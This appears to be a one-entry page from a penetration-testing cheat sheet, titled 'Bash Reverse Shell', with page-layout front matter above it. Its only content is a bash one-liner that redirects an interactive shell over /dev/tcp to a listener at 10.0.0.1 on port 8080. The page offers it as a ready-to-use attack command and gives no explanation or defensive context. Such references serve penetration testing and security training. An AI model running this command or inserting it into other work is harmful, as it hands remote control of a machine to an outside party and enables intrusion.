---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Bash Reverse Shell

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
